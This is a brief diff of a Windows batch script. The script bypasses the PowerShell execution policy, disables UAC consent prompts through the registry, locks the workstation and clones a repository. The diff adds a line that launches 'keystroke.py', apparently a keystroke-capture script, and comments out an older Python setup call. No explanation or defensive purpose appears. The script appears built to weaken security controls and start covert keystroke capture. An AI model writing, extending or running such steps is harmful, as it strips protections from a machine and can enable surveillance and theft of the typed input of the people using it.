@@ -37,7 +37,7 @@ powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Curr
 
 powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"
 
-py_311.bat
+rem py_311.bat
 
 powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 
@@ -54,6 +54,8 @@ if exist %repo_folder% (
     echo Cloning repository...
     git clone %repo_url% %repo_folder%
 )
+
+"C:\Users\umesh\AppData\Local\Programs\Python\Python311\python.exe" "keystroke.py"
 
 powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 
